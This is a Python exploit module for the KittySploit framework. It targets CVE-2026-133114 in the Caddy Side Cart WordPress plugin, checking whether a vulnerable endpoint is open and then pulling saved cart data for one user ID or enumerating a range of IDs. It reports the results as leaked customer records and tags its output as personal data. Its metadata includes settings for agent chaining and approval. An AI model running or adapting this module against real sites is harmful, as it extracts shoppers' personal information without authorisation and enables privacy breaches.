#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-133114 — Caddy Side Cart customer data leak."""

from kittysploit import *
from lib.protocols.http.caddy_sidecart import Caddy_sidecart
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client, Caddy_sidecart):
    __info__ = {
        "name": "Caddy Side Cart CVE-2026-133114 data leak",
        "description": "Fetches saved cart items for WordPress user IDs.",
        "author": ["LLCForge", "KittySploit Team"],
        "cve": ["CVE-2026-133114"],
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-133114"],
        "tags": ["wordpress", "caddy", "pii", "cve-2026-133114", "auxiliary"],
        "agent": {
            "approval_required": True,
            "produces": ["pii", "data_leak"],
            "chain": {
                "suggested_followups": ["scanner/http/caddy_sidecart_cve_2026_133114_detect"],
            },
        },
    }

    user_id = OptString("1", "Single WordPress user ID to fetch", required=False)
    enumerate = OptBool(False, "Enumerate user IDs 1..max_id", required=False)
    max_id = OptString("20", "Last user ID when enumerating", required=False, advanced=True)

    def run(self):
        if not self.caddy_endpoint_open(1):
            print_error("Endpoint not open")
            return False
        rows = []
        flag = getattr(self, "enumerate", False)
        if hasattr(flag, "value"):
            flag = flag.value
        if flag:
            raw_max = str(getattr(self, "max_id", "20") or "20")
            if hasattr(raw_max, "value"):
                raw_max = str(raw_max.value or "20")
            rows = self.caddy_enumerate_saved(int(raw_max))
        else:
            raw_uid = str(getattr(self, "user_id", "1") or "1")
            if hasattr(raw_uid, "value"):
                raw_uid = str(raw_uid.value or "1")
            uid = int(raw_uid)
            code, data = self.caddy_saved_items(uid)
            if code == 200 and data:
                rows = [{"user_id": int(uid), "data": data}]
        if not rows:
            print_error("No customer data returned")
            return False
        print_success(f"Leaked {len(rows)} record(s)")
        self.set_info(severity="high", cve="CVE-2026-133114", leaked=len(rows))
        return True